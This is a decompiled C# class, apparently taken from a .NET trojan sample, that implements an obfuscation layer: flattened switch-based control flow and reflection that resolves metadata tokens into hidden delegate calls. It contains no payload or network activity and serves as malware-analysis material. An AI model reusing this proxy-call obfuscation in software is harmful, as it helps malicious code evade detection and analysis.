// Decompiled with JetBrains decompiler
// Type: ProjNet.Common.BridgeAdvisor
// Assembly: IRefl, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A29A65F6-B7ED-422C-83D4-B9EFD61E5F13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-8e89881e34371e10b7f9cb943183a061aab9b22853cb7192e1ac09401f4cc545.exe

using ProjNet.Structs;
using System;
using System.Reflection;
using System.Runtime.CompilerServices;

namespace ProjNet.Common
{
  internal class BridgeAdvisor
  {
    internal static Module m_ExporterAdvisor;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void FindCreator(int typemdt)
    {
      int num1 = 4;
      while (true)
      {
        int num2 = num1;
        Type type;
        FieldInfo[] fields;
        int index;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
              for (; index < fields.Length; ++index)
              {
                FieldInfo fieldInfo = fields[index];
                MethodInfo method = (MethodInfo) BridgeAdvisor.m_ExporterAdvisor.ResolveMethod(fieldInfo.MetadataToken + 100663296);
                fieldInfo.SetValue((object) null, (object) (MulticastDelegate) Delegate.CreateDelegate(type, method));
              }
              if (true)
              {
                num2 = 6;
                continue;
              }
              goto label_11;
            case 1:
              goto label_1;
            case 2:
            case 5:
              index = 0;
              goto case 0;
            case 4:
              type = BridgeAdvisor.m_ExporterAdvisor.ResolveType(33554432 + typemdt);
              if (BridgeAdvisor.CalcCreator())
              {
                num2 = 1;
                continue;
              }
              goto case 0;
            case 6:
              goto label_7;
            default:
              if (BridgeAdvisor.CalcCreator())
              {
                num2 = 0;
                continue;
              }
              goto case 4;
          }
        }
label_1:
        fields = type.GetFields();
        num1 = 5;
      }
label_7:
      return;
label_11:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public BridgeAdvisor()
    {
      PageAdvisorStructBuilder.PrepareCreator();
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    static BridgeAdvisor()
    {
      PageAdvisorStructBuilder.PrepareCreator();
      BridgeAdvisor.m_ExporterAdvisor = typeof (BridgeAdvisor).Assembly.ManifestModule;
    }

    internal static bool CalcCreator() => true;

    internal static bool SelectCreator() => false;

    internal delegate void PredicateMerchantCandidate(object o);
  }
}
